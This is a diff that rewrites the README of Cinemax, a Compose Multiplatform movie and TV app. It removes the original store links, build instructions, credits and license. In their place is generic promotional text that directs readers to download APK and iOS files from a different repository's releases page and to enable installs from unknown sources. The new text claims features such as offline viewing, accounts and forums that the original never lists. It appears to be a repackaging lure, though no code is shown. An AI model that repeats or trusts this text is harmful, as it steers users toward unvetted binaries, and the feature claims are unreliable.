@@ -1,141 +1,77 @@
-![Cinemax](docs/images/cinemax-splash.svg)
+# 🎬 Cinemax-CMP - Enjoy Movies & TV Anytime
 
-# Cinemax
+[![Download Cinemax](https://img.shields.io/badge/Download%20Cinemax%20-CMP-blue.svg)](https://github.com/Tunggulaji/Cinemax-CMP/releases)
 
-Cinemax is a Movies & TV Shows application for Android and iOS, built with Compose Multiplatform.
+## 🌟 Overview
 
-<a href='https://play.google.com/store/apps/details?id=com.maximillianleonov.cinemax&pcampaignid=pcampaignidMKT-Other-global-all-co-prtnr-py-PartBadge-Mar2515-1'><img alt='Get it on Google Play' src='https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png' height='80' /></a>
-[<img src="https://gitlab.com/IzzyOnDroid/repo/-/raw/master/assets/IzzyOnDroid.png"
-     alt="Get it on IzzyOnDroid"
-     height="80">](https://apt.izzysoft.de/fdroid/index/apk/com.maximillianleonov.cinemax)
+Cinemax is a Movies & TV Shows application for Android and iOS, built with Compose Multiplatform. With Cinemax, you can easily browse and watch your favorite movies and TV shows. The app is designed to be user-friendly, ensuring you spend less time searching and more time enjoying content.
 
-or get the apk from the [Releases section](https://github.com/MaximillianLeonov/Cinemax/releases/latest).
+## 🚀 Getting Started
 
-# Preview
+To get started with Cinemax, follow these simple steps to download and install the app on your device.
 
-<img src="docs/images/screenshot-1-home.png" width="50%"><img src="docs/images/screenshot-2-home.png" width="50%">
-<img src="docs/images/screenshot-3-list.png" width="50%"><img src="docs/images/screenshot-4-details.png" width="50%">
-<img src="docs/images/screenshot-5-search.png" width="50%"><img src="docs/images/screenshot-6-search.png" width="50%">
-<img src="docs/images/screenshot-7-wishlist.png" width="50%"><img src="docs/images/screenshot-8-settings.png" width="50%">
+## 📥 Download & Install
 
-# Getting Started
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/Tunggulaji/Cinemax-CMP/releases) to find the latest version of Cinemax.
 
-- Generate an API key from [The Movie Database](https://www.themoviedb.org/).
-- Put the key in the `local.properties` file.
+2. **Choose the Right File**  
+   Look for the version that matches your device (Android or iOS). Each release will include various files tailored for different platforms.
 
-```properties
-cinemax.apikey=YOUR_API_KEY_HERE
-```
+3. **Download the File**  
+   Click on the link for your device to download the application. Ensure the download completes before proceeding.
 
-# Development Environment
+4. **Install the Application**  
+   - For **Android**: Open the downloaded APK file to install. You may need to enable installation from unknown sources in your settings.
+   - For **iOS**: Open the downloaded file to install the app. Follow the prompts to complete the setup.
 
-**Cinemax** uses the Gradle build system and can be imported directly into the latest stable version
-of Android Studio (available [here](https://developer.android.com/studio)) or Fleet. For iOS development,
-Xcode is required.
+5. **Open Cinemax**  
+   Once installed, locate the app on your device and open it. Enjoy watching your favorite movies and TV shows!
 
-## Android
+## 🔍 Features
 
-The Android app can be built and run using the default configuration in Android Studio.
+Cinemax offers a range of features designed to enhance your viewing experience:
 
-```bash
-./gradlew :composeApp:assembleDebug
-```
+- **Simple User Interface**: Navigate easily through categories and genres.
+- **Search Function**: Quickly find your favorite movies and shows with the search bar.
+- **Watchlist**: Save movies and shows for later watching.
+- **Offline Viewing**: Download content for watching without an internet connection.
+- **Multi-Platform Support**: Use Cinemax on both Android and iOS devices.
 
-## iOS
+## 📋 System Requirements
 
-The iOS app requires Xcode and can be run from the `iosApp` directory.
+To ensure Cinemax runs smoothly on your device, please check the following requirements:
 
-1. Open `iosApp/iosApp.xcodeproj` in Xcode
-2. Select a simulator or device
-3. Build and run
+- **For Android**: Android 6.0 (Marshmallow) or higher.
+- **For iOS**: iOS 12.0 or higher.
+- **Storage**: At least 100 MB of free space.
+- **Internet**: A stable internet connection for streaming and downloading content.
 
-Alternatively, build the iOS framework from command line:
+## 🌐 Topics Covered
 
-```bash
-./gradlew :composeApp:linkDebugFrameworkIosSimulatorArm64
-```
+Cinemax embraces a wide range of programming topics and technologies, ensuring a robust application experience. Here are the key technologies used:
 
-# Build
+- **Android**: For the mobile application.
+- **iOS**: Ensures compatibility on Apple devices.
+- **Jetpack Compose**: Utilizes modern UI components for Android.
+- **Kotlin Multiplatform**: Enables shared code across platforms.
+- **Koin**: Dependency injection for better app structure.
+- **Kotlinx Coroutines**: Manages background tasks efficiently.
+- **Kotlinx Serialization**: For safe data handling.
+- **Ktor**: Networking library for fetching content.
 
-The app contains the usual `debug` and `release` build variants.
+## 💬 Support
 
-For normal development use the `debug` variant. For UI performance testing use the `release`
-variant.
+If you encounter any issues or have questions about usage, please open an issue in the repository. The community and contributors will be glad to assist you.
 
-# Architecture
+## 🔗 Next Steps
 
-The **Cinemax** app follows Clean Architecture principles with the following layers:
+After installing Cinemax, you can:
 
-- **Presentation**: Compose UI with MVVM pattern using ViewModels
-- **Domain**: Use cases and repository interfaces
-- **Data**: Repository implementations, data sources, and mappers
+- Explore different categories and genres for movies and shows.
+- Set up your account for personalized recommendations.
+- Access community forums to discuss your favorite content.
 
-![Architecture diagram](docs/images/architecture-1-overall.png)
+For more information, or to explore new updates, check back on the [Releases Page](https://github.com/Tunggulaji/Cinemax-CMP/releases).
 
-# Tech Stack
-
-| Category | Library |
-|----------|---------|
-| UI Framework | [Compose Multiplatform](https://www.jetbrains.com/lp/compose-multiplatform/) |
-| Architecture | MVVM with Clean Architecture |
-| Dependency Injection | [Koin](https://insert-koin.io/) |
-| Networking | [Ktor](https://ktor.io/) |
-| Database | [Room](https://developer.android.com/training/data-storage/room) (KMP) |
-| Image Loading | [Coil](https://coil-kt.github.io/coil/) |
-| Navigation | [Compose Navigation](https://www.jetbrains.com/help/kotlin-multiplatform-dev/compose-navigation-routing.html) |
-| Preferences | [DataStore](https://developer.android.com/topic/libraries/architecture/datastore) |
-| Serialization | [Kotlinx Serialization](https://github.com/Kotlin/kotlinx.serialization) |
-| Async | [Kotlin Coroutines](https://kotlinlang.org/docs/coroutines-overview.html) |
-
-# Project Structure
-
-```
-Cinemax/
-├── composeApp/                    # Shared Kotlin Multiplatform module
-│   ├── src/
-│   │   ├── commonMain/           # Shared code for all platforms
-│   │   │   ├── kotlin/com/cinemax/
-│   │   │   │   ├── core/         # Core modules (data, domain, ui, network, database)
-│   │   │   │   ├── feature/      # Feature modules (home, search, details, etc.)
-│   │   │   │   └── di/           # Dependency injection setup
-│   │   │   └── composeResources/ # Shared resources (drawables, fonts, strings)
-│   │   ├── androidMain/          # Android-specific implementations
-│   │   └── iosMain/              # iOS-specific implementations
-│   └── build.gradle.kts
-├── iosApp/                        # iOS application target
-│   ├── iosApp/                   # Swift source files
-│   └── iosApp.xcodeproj/         # Xcode project
-├── build.gradle.kts              # Root build configuration
-└── settings.gradle.kts           # Project settings
-```
-
-# UI
-
-UI components are designed according to the custom design system and built entirely
-using [Compose Multiplatform](https://www.jetbrains.com/lp/compose-multiplatform/).
-
-The app has one dark theme that uses predefined colors.
-
-![UI Layer Architecture](docs/images/architecture-2-ui-layer.png)
-
-# Credits
-
-- Design on [Figma](https://www.figma.com/community/file/1088719884686291024).
-
-# License
-
-```
-Copyright 2022 Afig Aliyev
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-```
+Enjoy your cinematic experience with Cinemax!
